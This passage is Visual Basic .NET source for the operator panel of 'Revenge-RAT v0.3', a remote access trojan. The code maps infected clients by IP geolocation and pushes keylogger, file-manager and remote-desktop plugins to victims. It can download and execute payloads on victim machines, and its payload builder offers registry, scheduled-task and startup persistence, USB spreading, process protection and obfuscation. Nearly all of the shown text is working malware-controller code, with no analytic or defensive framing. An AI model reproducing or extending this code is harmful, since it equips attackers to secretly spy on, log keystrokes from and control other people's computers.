            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Try
                    Dim item2 As ListViewItem = current
                    Dim num2 As Integer = Conversions.ToInteger(item2.ToolTipText)
                    item2.ToolTipText = Conversions.ToString(num2)
                    Me.Document.LoadXml(New WebClient().DownloadString(("http://ip-api.com/xml/" & Me.s.IP(num2))))
                    str = String.Concat(New String() {str, Me.Document.DocumentElement.SelectSingleNode("lat").InnerText, ",", Me.Document.DocumentElement.SelectSingleNode("lon").InnerText, "|"})
                    Try
                        item2 = current
                        num2 = Conversions.ToInteger(item2.ToolTipText)
                        item2.ToolTipText = Conversions.ToString(num2)
                        Me.AVTI(Conversions.ToString(Me.AVTI(Strings.UCase(Me.GeoIP.LookupCountryName(Me.s.IP(num2))))))
                    Catch exception1 As Exception
                    End Try
                Catch exception2 As Exception

                End Try
                num += 1
            Loop
        Finally
        End Try
        Try
            Me.Label4.Visible = False
            Me.Label4.Text = ("Connected Clients : ( " & Conversions.ToString(num) & " )")
            File.WriteAllBytes((Path.GetTempPath & "Revenge-Clients-Map.jpg"), New WebClient().DownloadData(String.Concat(New String() {"http://maps.google.com/maps/api/staticmap?center=1,1&zoom=", Conversions.ToString(2), "&markers=color:red|", str, "&size=", Conversions.ToString(Me.Size.Width), "x", Conversions.ToString(Me.Size.Height), "&maptype=satellite&sensor=false"})))
            Me.PM.ImageLocation = (Path.GetTempPath & "Revenge-Clients-Map.jpg")
            Me.CICNE()
            num = 0
            Me.PM.Refresh()
        Catch exception3 As Exception
            ProjectData.SetProjectError(exception3)
            Dim exception As Exception = exception3
            MessageBox.Show(exception.Message.ToString, "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Hand)
            ProjectData.ClearProjectError()
        End Try
        Try
            File.Delete((Path.GetTempPath & "Revenge-Clients-Map.jpg"))
        Catch exception4 As Exception
        End Try
        Me.RFM.Enabled = True
    End Sub

    Private Sub EditToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EditToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.HostsList.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Dim expression As String = Interaction.InputBox("edit connection", "Revenge-RAT v0.3", (current.SubItems.Item(0).Text & ":" & current.SubItems.Item(1).Text), -1, -1)
                If (expression = Nothing) Then
                    MessageBox.Show("you must add your host or ip!", "Revenge-RAT v.0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
                    Return
                End If
                Dim strArray As String() = Strings.Split(expression, ":", -1, CompareMethod.Binary)
                If (strArray(0) = Nothing) Then
                    MessageBox.Show("you must add your host or ip!", "Revenge-RAT v.0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
                    Return
                End If
                If (strArray(1) = Nothing) Then
                    MessageBox.Show("you must add your port!", "Revenge-RAT v.0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
                    Return
                End If
                current.SubItems.Item(0).Text = strArray(0)
                current.SubItems.Item(1).Text = strArray(1)
            Loop
        Finally
        End Try
    End Sub

    Private Sub ENBPS_CheckedChanged(sender As Object, e As EventArgs) Handles ENBPS.CheckedChanged
        Me.PSCommands.Enabled = Me.ENBPS.Checked
        Me.TestPowershell.Enabled = Me.ENBPS.Checked
        If (Me.PSCommands.Text = Nothing) Then
            Me.PSCommands.Text = "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('Hello World!','Hello!',0,64)"
        End If
    End Sub

    Private Sub EUSB_CheckedChanged(sender As Object, e As EventArgs) Handles EUSB.CheckedChanged
        Me.CNINUS.Enabled = Me.EUSB.Checked
        Me.FNIUS.Enabled = Me.EUSB.Checked
        Me.TTINFHD.Enabled = Me.EUSB.Checked
        If (Me.CNINUS.Text = Nothing) Then
            Me.CNINUS.Text = "Client.exe"
        End If
        If (Me.FNIUS.Text = Nothing) Then
            Me.FNIUS.Text = "Revenge RAT"
        End If
    End Sub

    Private Sub ExitToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExitToolStripMenuItem.Click
        Me.ReIcon.Visible = False
        Process.GetCurrentProcess.Kill()
    End Sub

    Private Sub EXSPCK_Click(sender As Object, e As EventArgs) Handles EXSPCK.Click
        If (Me.EXSPL.SelectedIndex = -1) Then
            Me.EXSPL.SelectedIndex = 0
        End If
        Me.EXSPL.Enabled = Me.EXSPCK.Checked
    End Sub

    Private Sub FileManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FileManagerToolStripMenuItem.Click
        If File.Exists((Application.StartupPath & "\Plugin\FM.dll")) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = Me.Listview1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.Tag = "Pause"
                    Me.s.Send(Conversions.ToInteger(current.ToolTipText), String.Concat(New String() {"IE", Me.Key, SocketServer.md5(File.ReadAllBytes((Application.StartupPath & "\Plugin\FM.dll"))), Me.Key, current.ToolTipText, Me.Key, Conversions.ToString(True), Me.Key, "FM", Me.Key, "FM"}))
                Loop
            Finally
            End Try
        End If
    End Sub

    Private Sub FileManagerToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FileManagerToolStripMenuItem1.Click
        If File.Exists((Application.StartupPath & "\Plugin\FM.dll")) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = Me.TH.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.Tag = "Pause"
                    Me.s.Send(Conversions.ToInteger(current.ToolTipText), String.Concat(New String() {"IE", Me.Key, SocketServer.md5(File.ReadAllBytes((Application.StartupPath & "\Plugin\FM.dll"))), Me.Key, current.ToolTipText, Me.Key, Conversions.ToString(True), Me.Key, "FM", Me.Key, "FM"}))
                Loop
            Finally
            End Try
        End If
    End Sub

    Private Sub FP_CheckedChanged(sender As Object, e As EventArgs) Handles FP.CheckedChanged
        Me.BC.Enabled = Me.FP.Checked
        Me.KB.Enabled = Me.FP.Checked
        Me.MB.Enabled = Me.FP.Checked
        Me.GB.Enabled = Me.FP.Checked
    End Sub

    Private Sub FromDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromDiskToolStripMenuItem.Click
        If (Me.Listview1.SelectedItems.Count > 0) Then
            Dim dialog As New OpenFileDialog
            dialog.ShowDialog()

            If (dialog.FileName.Length > 0) Then
                Dim enumerator As IEnumerator
                Dim info As New FileInfo(dialog.FileName)
                Try
                    enumerator = Me.Listview1.SelectedItems.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        current.Tag = "Pause"
                        Me.s.Send(Conversions.ToInteger(current.ToolTipText), String.Concat(New String() {"UNV", Me.Key, Convert.ToBase64String(SocketServer.Compress(My.Resources.UNI)), Me.Key, "UNI.UNI", Me.Key, Me.RandomVariable(5, 8), Me.Key, "False", Me.Key, "False", Me.Key, "False", Me.Key, Me.RandomVariable(1, 5), Me.Key, Me.RandomVariable(1, 5), Me.Key, "False", Me.Key, "True", Me.Key, SocketServer.GenRandom(1, 10), ".tmp", Path.GetExtension(dialog.FileName), Me.Key, Convert.ToBase64String(File.ReadAllBytes(dialog.FileName)), Me.Key, "False"}))
                        current.Tag = "0"
                    Loop
                Finally
                End Try
            End If
        End If
    End Sub

    Private Sub FromDiskToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FromDiskToolStripMenuItem1.Click
        Dim flag As Boolean = Me.Listview1.SelectedItems.Count > 0
        If flag Then
            Dim openFileDialog As OpenFileDialog = New OpenFileDialog()
            openFileDialog.ShowDialog()
            flag = (openFileDialog.FileName.Length > 0)
            If flag Then
                Dim fileInfo As FileInfo = New FileInfo(openFileDialog.FileName)
                Try
                    Dim enumerator As IEnumerator = Me.Listview1.SelectedItems.GetEnumerator()
                    While enumerator.MoveNext()
                        Dim listViewItem As ListViewItem = CType(enumerator.Current, ListViewItem)
                        listViewItem.Tag = "Pause"
                        Me.s.Send(Conversions.ToInteger(listViewItem.ToolTipText), String.Concat(New String() {"UNV", Me.Key, Convert.ToBase64String(SocketServer.Compress(My.Resources.UNI)), Me.Key, "UNI.UNI", Me.Key, Me.RandomVariable(5, 8), Me.Key, "False", Me.Key, "False", Me.Key, "False", Me.Key, Me.RandomVariable(1, 5), Me.Key, Me.RandomVariable(1, 5), Me.Key, "True", Me.Key, "True", Me.Key, SocketServer.GenRandom(1, 10), ".tmp", Path.GetExtension(openFileDialog.FileName), Me.Key, Convert.ToBase64String(File.ReadAllBytes(openFileDialog.FileName)), Me.Key, "False"}))
                        listViewItem.Tag = "0"
                        Me.disconnected(Conversions.ToInteger(listViewItem.ToolTipText))
                    End While
                Finally
                End Try
            End If
        End If
    End Sub

    Private Sub FromLinkToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromLinkToolStripMenuItem.Click
        If (Me.Listview1.SelectedItems.Count > 0) Then
            Dim dae As New DAE
            dae.Text = "Download and execute"
            dae.ShowDialog()
        End If
    End Sub

    Private Sub FromLinkToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FromLinkToolStripMenuItem1.Click
        If (Me.Listview1.SelectedItems.Count > 0) Then
            Dim dae As New DAE
            dae.Text = "Download and update"
            dae.ShowDialog()
        End If
    End Sub

    Private Sub Genvrandom_Click(sender As Object, e As EventArgs) Handles Genvrandom.Click
        Me.ClientMutex.Text = ("RV_MUTEX-" & Me.RandomVariable(10, 15))
    End Sub
    Public Function GI(ByVal Input As String) As Object
        Return Me.Config.DocumentElement.SelectSingleNode(Input).InnerText
    End Function

    Public Function GS() As Integer
        Dim num2 As Integer
        Dim num4 As Integer
        Try
            Dim num5 As Integer
Label_0001:
            num5 = 1
            Dim num As Integer = 0
Label_0006:
            ProjectData.ClearProjectError()
            Dim num3 As Integer = -2
Label_000F:
            num5 = 3
            Dim enumerator As IEnumerator = Me.Listview1.Items.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
Label_0031:
                num5 = 4
                If Not (current.ForeColor = Color.FromArgb(&HE2, &H68, &H26)) Then
                    GoTo Label_005B
                End If
Label_0053:
                num5 = 5
                num += 1
Label_005B:
                num5 = 7
            Loop
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
Label_008A:
            num5 = 8
            num2 = num
            GoTo Label_011E
Label_00A1:
            num4 = 0
            Select Case (num4 + 1)
                Case 1
                    GoTo Label_0001
                Case 2
                    GoTo Label_0006
                Case 3
                    GoTo Label_000F
                Case 4
                    GoTo Label_0031
                Case 5
                    GoTo Label_0053
                Case 6, 7
                    GoTo Label_005B
                Case 8
                    GoTo Label_008A
                Case 9
                    GoTo Label_011E
                Case Else
                    GoTo Label_0113
            End Select
Label_00D3:
            num4 = num5
            Select Case If((num3 > -2), num3, 1)
                Case 0
                    GoTo Label_0113
                Case 1
                    GoTo Label_00A1
            End Select
        Catch obj1 As Exception
            GoTo Label_00D3
        End Try
Label_0113:
        'Throw ProjectData.CreateProjectError(-2146828237)
Label_011E:
        Return num2
    End Function

    Public Function GTN() As String
        If (DateTime.Now.Hour < 12) Then
            Return ("Good morning sir : " & Environment.MachineName)
        End If
        If (DateTime.Now.Hour < &H11) Then
            Return ("Good afternoon sir : " & Environment.MachineName)
        End If
        If (DateTime.Now.Hour > &H11) Then
            Return ("Good evening sir : " & Environment.MachineName)
        End If
        Return ("Good time to you sir : " & Environment.MachineName)
    End Function

    Public Function GTP() As Object
        Dim obj2 As Object
        Try
            If Me.TreeView1.SelectedNode.Text.EndsWith(".png") Then
                Me.TabControl1.SelectedIndex = 1
                Me.PictureBox1.ImageLocation = Me.TreeView1.SelectedNode.ToolTipText
                Me.ToolStripStatusLabel21.Text = Me.TreeView1.SelectedNode.ToolTipText
                Return obj2
            End If
            If Me.TreeView1.SelectedNode.Text.EndsWith(".Log") Then
                Me.TabControl1.SelectedIndex = 0
                Me.TextBox6.Text = File.ReadAllText(Me.TreeView1.SelectedNode.ToolTipText)
                Me.ToolStripStatusLabel18.Text = Me.TreeView1.SelectedNode.ToolTipText
                Return obj2
            End If
            If Me.TreeView1.SelectedNode.Text.EndsWith(".txt") Then
                Me.TabControl1.SelectedIndex = 0
                Me.TextBox6.Text = File.ReadAllText(Me.TreeView1.SelectedNode.ToolTipText)
                Me.ToolStripStatusLabel18.Text = Me.TreeView1.SelectedNode.ToolTipText
                Return obj2
            End If
            If Not Operators.ConditionalCompareObjectEqual(Me.TreeView1.SelectedNode.Tag, "0", False) Then
                Return obj2
            End If
            Dim str As String
            For Each str In Directory.GetDirectories(Me.TreeView1.SelectedNode.ToolTipText)
                Dim node As TreeNode = Me.TreeView1.SelectedNode.Nodes.Add(str, Path.GetFileName(str), 0, 0)
                node.ToolTipText = str
                node.Tag = "0"
            Next
            Dim str2 As String
            For Each str2 In Directory.GetFiles(Me.TreeView1.SelectedNode.ToolTipText)
                Dim obj3 As Object
                If (Path.GetExtension(str2) = ".Log") Then
                    obj3 = Me.TreeView1.SelectedNode.Nodes.Add(str2, Path.GetFileName(str2), 1, 1)
                    NewLateBinding.LateSet(obj3, Nothing, "ToolTipText", New Object() {str2}, Nothing, Nothing)
                    NewLateBinding.LateSet(obj3, Nothing, "Tag", New Object() {"0"}, Nothing, Nothing)
                ElseIf (Path.GetExtension(str2) = ".txt") Then
                    obj3 = Me.TreeView1.SelectedNode.Nodes.Add(str2, Path.GetFileName(str2), 1, 1)
                    NewLateBinding.LateSet(obj3, Nothing, "ToolTipText", New Object() {str2}, Nothing, Nothing)
                    NewLateBinding.LateSet(obj3, Nothing, "Tag", New Object() {"0"}, Nothing, Nothing)
                ElseIf (Path.GetExtension(str2) = ".png") Then
                    obj3 = Me.TreeView1.SelectedNode.Nodes.Add(str2, Path.GetFileName(str2), 2, 2)
                    NewLateBinding.LateSet(obj3, Nothing, "ToolTipText", New Object() {str2}, Nothing, Nothing)
                    NewLateBinding.LateSet(obj3, Nothing, "Tag", New Object() {"0"}, Nothing, Nothing)
                End If
            Next
            Me.TreeView1.SelectedNode.Tag = "1"
            Me.TreeView1.SelectedNode.Expand()
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
        Return obj2
    End Function

    Private Sub HoFS_Click(sender As Object, e As EventArgs) Handles HoFS.Click
        If Operators.ConditionalCompareObjectEqual(Me.HoFS.Tag, "Down", False) Then
            Me.HoFS.Tag = "Up"
            Me.HoFS.Image = My.Resources.expand_less_white_24x24
            Dim size3 As New Size(Me.TableLayoutPanel34.Size.Width, &H20)
            Me.TableLayoutPanel34.Size = size3
        Else
            Me.HoFS.Tag = "Down"
            Me.HoFS.Image = My.Resources.expand_more_white_24x24
            Dim size2 As New Size(Me.TableLayoutPanel34.Size.Width, &H127)
            Me.TableLayoutPanel34.Size = size2
        End If
    End Sub

    Private Sub IconSettings_Click(sender As Object, e As EventArgs) Handles IconSettings.Click
        If Operators.ConditionalCompareObjectEqual(Me.IconSettings.Tag, "Down", False) Then
            Me.IconSettings.Tag = "Up"
            Me.IconSettings.Image = My.Resources.expand_less_white_24x24
            Dim size3 As New Size(Me.TableLayoutPanel37.Size.Width, &H20)
            Me.TableLayoutPanel37.Size = size3
        Else
            Me.IconSettings.Tag = "Down"
            Me.IconSettings.Image = My.Resources.expand_more_white_24x24
            Dim size2 As New Size(Me.TableLayoutPanel37.Size.Width, 650)
            Me.TableLayoutPanel37.Size = size2
        End If
    End Sub

    Private Sub IE_CheckedChanged(sender As Object, e As EventArgs) Handles IE.CheckedChanged
        Me.VI.Enabled = Me.IE.Checked
        Me.PI.Enabled = Me.IE.Checked
        Me.Label44.Visible = Me.IE.Checked
        If (Me.VI.SelectedIndex = -1) Then
            Me.VI.SelectedIndex = 0
        End If
        If (Me.PI.SelectedIndex = -1) Then
            Me.PI.SelectedIndex = 0
        End If
    End Sub

    Private Sub INSTASE_Click(sender As Object, e As EventArgs) Handles INSTASE.Click
        If Operators.ConditionalCompareObjectEqual(Me.INSTASE.Tag, "Down", False) Then
            Me.INSTASE.Tag = "Up"
            Me.INSTASE.Image = My.Resources.expand_less_white_24x24
            Dim size3 As New Size(Me.TableLayoutPanel26.Size.Width, &H20)
            Me.TableLayoutPanel26.Size = size3
        Else
            Me.INSTASE.Tag = "Down"
            Dim size2 As New Size(Me.TableLayoutPanel26.Size.Width, &H22B)
            Me.TableLayoutPanel26.Size = size2
            Me.INSTASE.Image = My.Resources.expand_more_white_24x24
        End If

    End Sub

    Private Sub JSCK_CheckedChanged(sender As Object, e As EventArgs) Handles JSCK.CheckedChanged
        Me.JSTX.Enabled = Me.JSCK.Checked
        If (Me.JSTX.Text = Nothing) Then
            Me.JSTX.Text = "Client"
        End If

    End Sub

    Private Sub KeyloggerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KeyloggerToolStripMenuItem.Click
        If File.Exists((Application.StartupPath & "\Plugin\KE.dll")) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = Me.Listview1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.Tag = "Pause"
                    Me.s.Send(Conversions.ToInteger(current.ToolTipText), String.Concat(New String() {"IE", Me.Key, SocketServer.md5(File.ReadAllBytes((Application.StartupPath & "\Plugin\KE.dll"))), Me.Key, current.ToolTipText, Me.Key, Conversions.ToString(True), Me.Key, "KE", Me.Key, "KE"}))
                Loop
            Finally
            End Try
        End If
    End Sub

    Private Sub LGF_DoubleClick(sender As Object, e As EventArgs) Handles LGF.DoubleClick
        Try
            If (Me.LGF.SelectedItems.Count > 0) Then
                Me.OL.Items.Clear()
                Dim strArray As String() = Strings.Split(File.ReadAllText(Me.LGF.SelectedItems.Item(0).ToolTipText), "|", -1, CompareMethod.Binary)
                Dim num2 As Integer = (strArray.Length - 2)
                Dim i As Integer = 0
                Do While (i <= num2)
                    Dim item As ListViewItem = Me.OL.Items.Add(strArray(i), Me.ImageList3.Images.IndexOfKey(strArray((i + 2))))
                    item.SubItems.Add(strArray((i + 1)))
                    If (strArray((i + 1)) = "Online") Then
                        item.ForeColor = Color.Green
                    ElseIf strArray(i).Contains("Revenge Started") Then
                        item.ForeColor = Color.Blue
                    ElseIf strArray(i).Contains("Listening") Then
                        item.ForeColor = Color.Purple
                    ElseIf strArray((i + 1)).Contains("Download and execute from URL") Then
                        item.ForeColor = Color.Blue
                    ElseIf strArray((i + 1)).Contains("Uninstall") Then
                        item.ForeColor = Color.PaleVioletRed
                    ElseIf strArray((i + 1)).Contains("Restart") Then
                        item.ForeColor = Color.MidnightBlue
                    ElseIf strArray((i + 1)).Contains("Close") Then
                        item.ForeColor = Color.DeepSkyBlue
                    Else
                        item.ForeColor = Color.Red
                    End If
                    i = (i + 2)
                    i += 1
                Loop
            End If
            Me.OL.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
            Me.ToolStripStatusLabel14.Text = (Me.LGF.SelectedItems.Item(0).ToolTipText & " loaded successfully")
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub LinkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Process.Start(Application.ExecutablePath)
        Me.ReIcon.Visible = False
        Me.Visible = False
        Process.GetCurrentProcess.Kill()
    End Sub

    Private Sub LinkLabel2_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel2.LinkClicked
        Me.x(Me.THN.SelectedIndex)
    End Sub

    Private Sub LinkLabel3_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel3.LinkClicked
        My.Forms.TOS_ABOUT.ShowDialog()
    End Sub

    Private Sub Listview1_ColumnClick(sender As Object, e As ColumnClickEventArgs) Handles Listview1.ColumnClick
        Dim ascending As SortOrder
        Dim header As ColumnHeader = DirectCast(NewLateBinding.LateGet(sender, Nothing, "Columns", New Object() {e.Column}, Nothing, Nothing, Nothing), ColumnHeader)
        If (Me.m_SortingColumn Is Nothing) Then
            ascending = SortOrder.Ascending
        ElseIf header.Equals(Me.m_SortingColumn) Then
            If Operators.ConditionalCompareObjectEqual(Me.m_SortingColumn.Tag, "+", False) Then
                ascending = SortOrder.Descending
            Else
                ascending = SortOrder.Ascending
            End If
        Else
            ascending = SortOrder.Ascending
        End If
        Me.m_SortingColumn = header
        If (ascending = SortOrder.Ascending) Then
            Me.m_SortingColumn.Tag = "+"
        Else
            Me.m_SortingColumn.Tag = "-"
        End If
        If (Not sender Is Nothing) Then
            NewLateBinding.LateSet(sender, Nothing, "ListViewItemSorter", New Object() {New clsListviewSorter(e.Column, ascending)}, Nothing, Nothing)
            NewLateBinding.LateCall(sender, Nothing, "Sort", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
            NewLateBinding.LateSet(sender, Nothing, "ListViewItemSorter", New Object() {Nothing}, Nothing, Nothing)
        End If
    End Sub

    Private Sub Listview1_DoubleClick(sender As Object, e As EventArgs) Handles Listview1.DoubleClick
        If File.Exists((Application.StartupPath & "\Plugin\SPC.dll")) Then
            Me.s.Send(Conversions.ToInteger(Me.Listview1.SelectedItems.Item(0).ToolTipText), String.Concat(New String() {"IE", Me.Key, SocketServer.md5(File.ReadAllBytes((Application.StartupPath & "\Plugin\SPC.dll"))), Me.Key, Me.Listview1.SelectedItems.Item(0).ToolTipText, Me.Key, Conversions.ToString(True), Me.Key, "SPC", Me.Key, "SPC"}))
        End If
    End Sub

    Private Sub LNKCK_CheckedChanged(sender As Object, e As EventArgs) Handles LNKCK.CheckedChanged
        Me.LNKTX.Enabled = Me.LNKCK.Checked
        If (Me.LNKTX.Text = Nothing) Then
            Me.LNKTX.Text = "Client"
        End If
    End Sub
    Public Function Load_Builder_Settings(ByVal Profile As String) As Object
        Dim obj2 As Object
        If Not File.Exists(("Profiles\" & Profile & ".ini")) Then
            File.WriteAllText((Application.StartupPath & "\Profiles\" & Profile & ".ini"), My.Resources.DefaultSettings)
        End If
        Dim strArray3 As String() = Strings.Split(File.ReadAllText(("Profiles\" & Profile & ".ini")), ChrW(13) & ChrW(10), -1, CompareMethod.Binary)
        Dim strArray As String() = Strings.Split(strArray3(0), ",", -1, CompareMethod.Binary)
        Dim strArray2 As String() = Strings.Split(strArray3(1), ",", -1, CompareMethod.Binary)
        Me.HostsList.Items.Clear()
        Dim num2 As Integer = (strArray.Length - 2)
        Dim i As Integer = 0
        Do While (i <= num2)
            Me.HostsList.Items.Add(strArray(i), 0).SubItems.Add(strArray2(i))
            i += 1
        Loop
        Me.ClientID.Text = strArray3(2)
        Me.ClientMutex.Text = strArray3(3)
        Me.RCD.Value = Conversions.ToDecimal(strArray3(4))
        Me.DF.Checked = Conversions.ToBoolean(strArray3(5))
        Me.DropPathCombo.SelectedIndex = Conversions.ToInteger(strArray3(6))
        Me.DN.Text = strArray3(7)
        Me.Registry.Checked = Conversions.ToBoolean(strArray3(8))
        Me.RK.Text = strArray3(9)
        Me.RGVN.Text = strArray3(10)
        Me.SCHULDER.Checked = Conversions.ToBoolean(strArray3(11))
        Me.Schname.Text = strArray3(12)
        Me.Schtime.Value = Conversions.ToDecimal(strArray3(13))
        Me.CMPM.Checked = Conversions.ToBoolean(strArray3(14))
        Me.CNINAPPDATA.Text = strArray3(15)
        Me.TASKBARFN.Text = strArray3(&H10)
        Me.DESKTOPSHORTCUTPATH.Text = strArray3(&H11)
        Me.QUICKLUNCHSHORTCUTPATH.Text = strArray3(&H12)
        Me.StartupNormal.Checked = Conversions.ToBoolean(strArray3(&H13))
        Me.StartNormalfile.Text = strArray3(20)
        Me.VBSCK.Checked = Conversions.ToBoolean(strArray3(&H15))
        Me.VBSTX.Text = strArray3(&H16)
        Me.JSCK.Checked = Conversions.ToBoolean(strArray3(&H17))
        Me.JSTX.Text = strArray3(&H18)
        Me.LNKCK.Checked = Conversions.ToBoolean(strArray3(&H19))
        Me.LNKTX.Text = strArray3(&H1A)
        Me.URLCK.Checked = Conversions.ToBoolean(strArray3(&H1B))
        Me.URLTX.Text = strArray3(&H1C)
        Me.StartupCodeDomCK.Checked = Conversions.ToBoolean(strArray3(&H1D))
        Me.CodeDomTX.Text = strArray3(30)
        Me.ENBPS.Checked = Conversions.ToBoolean(strArray3(&H1F))
        Me.PSCommands.Text = strArray3(&H20)
        Me.SMGB.Checked = Conversions.ToBoolean(strArray3(&H21))
        Me.MsgboxTitle.Text = strArray3(&H22)
        Me.MsgboxBody.Text = strArray3(&H23).Replace("\r\n", ChrW(13) & ChrW(10))
        Me.MsgBoxIcon.SelectedIndex = Conversions.ToInteger(strArray3(&H24))
        Me.MsgboxButton.SelectedIndex = Conversions.ToInteger(strArray3(&H25))
        Me.AssemblyChange.Checked = Conversions.ToBoolean(strArray3(&H26))
        Me.AssTitle.Text = strArray3(&H27)
        Me.AssDes.Text = strArray3(40)
        Me.AssCom.Text = strArray3(&H29)
        Me.AssPro.Text = strArray3(&H2A)
        Me.AssCopy.Text = strArray3(&H2B)
        Me.AssTrade.Text = strArray3(&H2C)
        Me.FileVersionTX.Text = strArray3(&H2D)
        Me.ProductVersionTX.Text = strArray3(&H2E)
        Me.IE.Checked = Conversions.ToBoolean(strArray3(&H2F))
        Me.VI.SelectedIndex = Conversions.ToInteger(strArray3(&H30))
        Me.PI.SelectedIndex = Conversions.ToInteger(strArray3(&H31))
        Me.EUSB.Checked = Conversions.ToBoolean(strArray3(50))
        Me.CNINUS.Text = strArray3(&H33)
        Me.FNIUS.Text = strArray3(&H34)
        Me.TTINFHD.Checked = Conversions.ToBoolean(strArray3(&H35))
        Me.SCPROC.Checked = Conversions.ToBoolean(strArray3(&H36))
        Me.RGP.Checked = Conversions.ToBoolean(strArray3(&H37))
        Me.HFCK.Checked = Conversions.ToBoolean(strArray3(&H38))
        Me.PRPR.Checked = Conversions.ToBoolean(strArray3(&H39))
        Me.PRCB.SelectedIndex = Conversions.ToInteger(strArray3(&H3A))
        Me.SleepCk.Checked = Conversions.ToBoolean(strArray3(&H3B))
        Me.SleepTime.Value = Conversions.ToDecimal(strArray3(60))
        Me.RCNNS.Checked = Conversions.ToBoolean(strArray3(&H3D))
        Me.RadioButton1.Checked = Conversions.ToBoolean(strArray3(&H3E))
        Me.RadioButton2.Checked = Conversions.ToBoolean(strArray3(&H3F))
        Me.EXSPCK.Checked = Conversions.ToBoolean(strArray3(&H40))
        Me.EXSPL.SelectedIndex = Conversions.ToInteger(strArray3(&H41))
        Me.FP.Checked = Conversions.ToBoolean(strArray3(&H42))
        Me.BC.Value = Conversions.ToDecimal(strArray3(&H43))
        Me.KB.Checked = Conversions.ToBoolean(strArray3(&H44))
        Me.MB.Checked = Conversions.ToBoolean(strArray3(&H45))
        Me.GB.Checked = Conversions.ToBoolean(strArray3(70))
        Me.MP.Checked = Conversions.ToBoolean(strArray3(&H47))
        Me.ATOS.Checked = Conversions.ToBoolean(strArray3(&H48))
        Me.ATAM.Checked = Conversions.ToBoolean(strArray3(&H49))
        Me.ANIL.Checked = Conversions.ToBoolean(strArray3(&H4A))
        Me.OPT.Checked = Conversions.ToBoolean(strArray3(&H4B))
        Me.STEN.Checked = Conversions.ToBoolean(strArray3(&H4C))
        Me.Obfu.Checked = Conversions.ToBoolean(strArray3(&H4D))
        Return obj2
    End Function

    Public Function Load_Config() As Object
        Dim obj2 As Object
        Me.Config.Load((Application.StartupPath & "\Config.XML"))
        If Not Me.Bla Then
            Me.Bla = True
            Dim str As String
            For Each str In Directory.GetFiles((Application.StartupPath & "\Themes\"))
                If (Not Me.CIST(Path.GetFileName(str)) AndAlso Me.CEF(Path.GetExtension(str))) Then
                    Me.THN.Items.Add(Path.GetFileNameWithoutExtension(str))
                End If
            Next
            My.Forms.Entry_Form.SocketKey.Text = Conversions.ToString(Me.GI("Socket_Key"))
            My.Forms.Entry_Form.CPort.Value = Conversions.ToDecimal(Me.GI("Connections_Port"))
        End If
        Me.MST.Checked = Conversions.ToBoolean(Me.GI("Minimizing"))
        Me.ALTP.Checked = Conversions.ToBoolean(Me.GI("Listening"))
        My.Forms.Entry_Form.PINGN.Value = Conversions.ToDecimal(Me.GI("Ping"))
        Me.Visual.Checked = Conversions.ToBoolean(Me.GI("Visual"))
        Me.Noti.Checked = Conversions.ToBoolean(Me.GI("Notification"))
        Me.SNO.Checked = Conversions.ToBoolean(Me.GI("Sound"))
        Me.ASD.Checked = Conversions.ToBoolean(Me.GI("Desktop"))
        Me.RDV.SelectedIndex = Conversions.ToInteger(Me.GI("DesktopValue"))
        Me.ASWC.Checked = Conversions.ToBoolean(Me.GI("Webcam"))
        Me.RWCV.SelectedIndex = Conversions.ToInteger(Me.GI("WebcamValue"))
        Me.TQ.SelectedIndex = Conversions.ToInteger(Me.GI("ThumbnailsValue"))
        Me.FZ.SelectedIndex = Conversions.ToInteger(Me.GI("Flags"))
        Me.gridlines.Checked = Conversions.ToBoolean(Me.GI("Gridlines"))
        Me.VA.SelectedIndex = Conversions.ToInteger(Me.GI("View"))
        Try
            Me.THN.SelectedIndex = Conversions.ToInteger(Me.GI("Theme"))
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            Me.THN.SelectedIndex = 0
            ProjectData.ClearProjectError()
        End Try
        Me.ACR.Checked = Conversions.ToBoolean(Me.GI("ACR"))
        Me.CT = Me.THN.SelectedIndex
